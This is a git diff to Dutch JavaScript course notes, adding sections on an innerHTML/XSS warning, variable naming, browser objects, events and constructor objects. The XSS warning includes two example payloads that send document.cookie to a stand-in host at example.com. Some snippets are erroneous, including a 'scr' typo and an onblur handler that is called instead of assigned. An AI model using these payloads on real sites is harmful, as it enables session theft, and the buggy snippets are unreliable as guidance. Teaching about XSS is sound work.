@@ -86,6 +86,20 @@ function goBackTitle() {
 
 ::: danger Waarschuwing
 Gebruik nooit de syntax `.innerHTML`, het houd enorme **security risico's** in!
+
+Met name **Cross-Site Scripting Attacks** (XSS). Hieronder twee voorbeelden hoe een hacker met eenvoudige code toegang krijgt tot een useraccount:
+
+1. In dit voorbeeld bewaren we cookie info in een variabele die vervolgens kan verzonden worden naar een andere server.
+
+```html
+<script>var adr='http://example.com/xss.php?cookie=' + escape(document.cookie);</script>
+```
+
+2. In dit voorbeeld gebruiken we een ontbrekende afbeelding met een HTML atribuut om code te triggeren
+
+```html
+<img scr="http://nofile" onerror="adr='http.example.com/xss.php?'+escape(document.cookie)";>
+```
 :::
 
 #### Style aanpassen
@@ -211,6 +225,8 @@ Of je kan terug met een aparte file werken, wat de voorkeur geniet.
 </body>
 ```
 
+Als de browser een `<script>` element tegen komt zal het op die plaats pas het script laden en kijken of het iets moet doen.
+
 ::: tip Tip
 Maak een folder 'scripts' aan waarin je de Javascript bestanden plaatst.
 
@@ -252,6 +268,15 @@ Om te vermijden dat je die let, var of const per ongeluk zou vergeten kan je bov
 let somevariable;
 ```
 :::
+
+**Regels omtrent naamgeving van variabelen**
+
+1. De naam moet met een letter, een `$` of een `_` starten. Nooit met een cijfer!
+2. De naam kan letters, cijfers, een `$` of een `_` bevatten. Nooit een `-`  of `.`!
+3. Je kan geen woorden gebruiken die een script betekenis hebben (bv. var).
+4. De naam is hoofdletter gevoelig, je start die altijd met een kleine letter. Je hergebruikt nooit een variabele naam met een andere hoofdletter combinatie.
+5. Gebruik een naam dat de informatieinhoud ervan beschrijft. 
+6. Als een naam uit meerdere woorden bestaat gebruik je voor het tweede woord een hoofdletter (bv. firstName) of een `_` (bv. first_name).
 
 #### Datatypes
 
@@ -471,6 +496,16 @@ Zoals steeds is het 'good-practice' om je code van commentaar te voorzien.
 // Commentaar op 1 enkele lijn.
 ```
 
+#### Browser objecten
+
+Op het hoogste niveau bevind zich het **browser object model** met informatie van het huidige browser venster of tabblad.
+
+![image](./images/afbeelding28.png)
+
+Een niveau lager kan je het **document object model** terugvinden met informatie over de DOM structuur van de pagina.
+
+![image](./images/afbeelding29.png)
+
 #### HTML elementen vinden
 
 Om in javascript elementen van een html pagina op te vragen bestaan er enkele mogelijkheden:
@@ -481,6 +516,54 @@ Om in javascript elementen van een html pagina op te vragen bestaan er enkele mo
 * querySelectorAll() : lijst van elementen die voldoet aan een CSS selector
 * querySelector() : eerste element die voldoet aan een CSS selector
 
+#### Events behandelen
+
+Events zijn alle gebeurtenissen in een browser. bv de gebruiker klikt ergens op, een element krijgt de focus, ...
+
+**Oudere techniek (ondersteunt door alle browsers)**
+
+Je kan voor een browser één functie koppelen aan een event.
+
+![image](./images/afbeelding30.png)
+
+```js
+function checkUsername(){
+  // code...
+}
+
+let userName = document.getElementById('username');
+userName.onblur = checkUsername(); // als de focus van dit element verdwijnt voer dan deze functie uit.
+```
+
+**Nieuwere techniek (enkel ondersteunt door nieuwere browsers)**
+
+Je kan nu meerdere functies aan een event koppelen.
+
+![image](./images/afbeelding31.png)
+
+```js
+function checkUsername(){
+  // code...
+}
+
+let userName = document.getElementById('username');
+userName.addEventListener('blur', checkUsername, false);
+```
+
+Een event is eigenlijk ook een object met eigenschappen.
+
+Zo kan je bv. in de afhandelende functie achterhalen wie de eigenaar was van het event:
+
+```js
+function checkUsername(e){
+  let target = e.target; // eigenaar van het event.
+  // code...
+}
+
+let userName = document.getElementById('username');
+userName.addEventListener('blur', checkUsername, false);
+```
+
 #### Good practices
 
 * Als je manuele indentatie voorziet, gebruik dan steeds ofwel spaties ofwel tabs maar combineer ze niet.
@@ -490,6 +573,33 @@ Om in javascript elementen van een html pagina op te vragen bestaan er enkele mo
   * na een `if`, `for`, `while` en `function`
   * voor en na een operator (`==`, `<`, `&&`, `+`, ...)
 * Vermijd het gebruik van `var` om een variabele te definiëren
+
+#### Objecten gebruiken als een soort klasse
+
+Stel we willen een klasse **hotel** waarin we de naam van het hotel, het aantal kamers en het aantal geboekte kamers willen in bewaren.
+Daarnaast willen we ook een functie die de nog beschikbare kamers teruggeeft.
+
+Dan kunnen we als volgt een constructor hiervoor schrijven:
+```js
+function  hotel(name, rooms, booked){
+  this.name = name;
+  this.rooms = rooms;
+  this.booked = booked;
+  this.checkAvailability = function(){
+    return this.rooms - this.booked;
+  }
+}
+```
+en als volgt het hotel definieren:
+
+```js
+let parkHotel = new hotel('Park',120,77);
+```
+als we nu het nog beschikbare aantal kamers willen hebben schrijven we:
+
+```js
+let available = parkHotel.checkAvailability();
+```
 
 ### JavaScript Object Notation (JSON)
 
